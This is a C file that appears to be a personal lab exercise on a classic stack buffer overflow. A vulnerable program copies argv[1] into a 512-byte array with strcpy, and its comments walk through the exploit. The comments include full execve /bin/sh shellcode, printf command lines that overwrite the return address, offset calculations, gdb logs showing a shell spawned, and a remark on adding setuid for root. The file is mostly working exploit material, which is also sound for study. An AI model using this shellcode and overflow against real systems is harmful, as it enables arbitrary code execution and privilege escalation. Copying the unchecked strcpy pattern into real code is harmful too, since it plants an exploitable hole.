// file: victim.c

#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[])
{
	char little_arr[512];
	if (argc > 1)
		 strcpy(little_arr, argv[1]);
}

// ==================================
// Guess Method:
// ==================================
// $./victim $(printf "\xeb\x16\x5e\x31\xd2\x52\x56\x89\xe1\x89\xf3\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68%0480x\x88\xec\xff\xbf")
// 
// Note 1: input shellcode
// -----------------------
// printf format: shellcode(length=36B) + '0'*480(=512-36+4 + 0~16) + address little_arr
// 080483c4 <main>:
//  80483c4:	55						push   %ebp
//  80483c5:	89 e5					mov    %esp,%ebp
//  80483c7:	83 e4 f0				and    $0xfffffff0,%esp
//  80483ca:	81 ec 10 02 00 00		sub    $0x210,%esp
//  ...
//  80483e2:	8d 44 24 10				lea    0x10(%esp),%eax
//  [res=0x10=10B][little_arr=0x200=512B][align bytes][EBP=4B][RET=4B]
//                SHELLCODE00000000000000000000000000000000000BFFFEC88
//
// Note 2: calculate the offset RET
// --------------------------------
// the count of '0' can be acculated by following method:
// chasond@centos_12 ~/linux-debug/shellcode
// $./victim $(printf "%0512x" 0)
// chasond@centos_12 ~/linux-debug/shellcode
// $./victim $(printf "%0516x" 0)
// chasond@centos_12 ~/linux-debug/shellcode
// $./victim $(printf "%0520x" 0)
// chasond@centos_12 ~/linux-debug/shellcode
// $./victim $(printf "%0524x" 0) # crash EBP
// Segmentation fault
// $./victim $(printf "%0528x" 0) # crash EBP and RET
// Segmentation fault
//
// So the offset little_arr with RET is 528, and the count of '0' is
// 528 - 36(shellcode length) -  4(RET length) = 488.
// Using GDB, it also can be calculated by (reg(EBP)+8 - &litte_arr)
// (gdb) set $var=($ebp+8-(&little_arr[0]))
// (gdb) p $var
// $1 = 528
// 
// Note 3: find the start address of shellcode (little_arr)
// --------------------------------------------------------
// Address little_arr can be got by gdb, and then set args.
// Guessing is also another method. First we get the aligned ESP by 
// application find-esp-nosp (keep same compile options).
// $./find-esp-nosp 
// 0xbffff098 # ======> the address of little_arr is less than this value
// So maybe we should try many times (the worst 1000 times) until we get the right address.
//
// Note 3: demo log
// ----------------
// (gdb) p &little_arr 
// $1 = (char (*)[512]) 0xbfffec80
// (gdb) info reg
// ebp            0xbfffee88	0xbfffee88
// (gdb) x/8xb 0xbfffee88
// 0xbfffee88:	0x30	0x30	0x30	0x30	0x88	0xec	0xff	0xbf
// (gdb) x/40xb little_arr 
// 0xbfffec88:	0xeb	0x16	0x5e	0x31	0xd2	0x52	0x56	0x89
// 0xbfffec90:	0xe1	0x89	0xf3	0x31	0xc0	0xb0	0x0b	0xcd
// 0xbfffec98:	0x80	0x31	0xdb	0x31	0xc0	0x40	0xcd	0x80
// 0xbfffeca0:	0xe8	0xe5	0xff	0xff	0xff	0x2f	0x62	0x69
// 0xbfffeca8:	0x6e	0x2f	0x73	0x68	0x30	0x30	0x30	0x30
// (gdb) set little_arr[36] = '\0'
// (gdb) c
// Continuing.
// process 15545 is executing new program: /bin/bash
//
// Breakpoint 1, 0x0805f0e3 in main ()
// Missing separate debuginfos, use: debuginfo-install bash-4.1.2-9.el6_2.i686
// (gdb) c
// Continuing.
// sh-4.1$ 
//
// Note 4: (gdb) set little_arr[36] = '\0'
// ---------------------------------------
// Change the shellcode to execv3.v2, and that is ok.
// It is not allowed there is 0x20 in shellcode, since 0x20 is whitespace which also is arguments separator.
// 
// $./victim $(printf "\xeb\x21\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x31\xdb\x31\xc0\xb0\x01\xcd\x80\xe8\xda\xff\xff\xff%0484x\x90\xec\xff\xbf")
// sh-4.1$
// sh-4.1$
//
// $strace ./victim $(printf "\xeb\x20\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xda\xff\xff\xff%0485x\x90\xec\xff\xbf")
// execve("./victim", ["./victim", "\353", "1\300Phn/shh//bi\211\343PS\211\3411\322\260\v\315\2001\3331\300@\315\200"...], [/* 63 vars */]) = 0
// =======================>       \353=\xeb   \x31='1', treat 0x20 as arguments separator
// 
// 
// Note 5: get root privilege failed
// ---------------------------------
// Due to shellcode, and add setuid, that is ok.
//
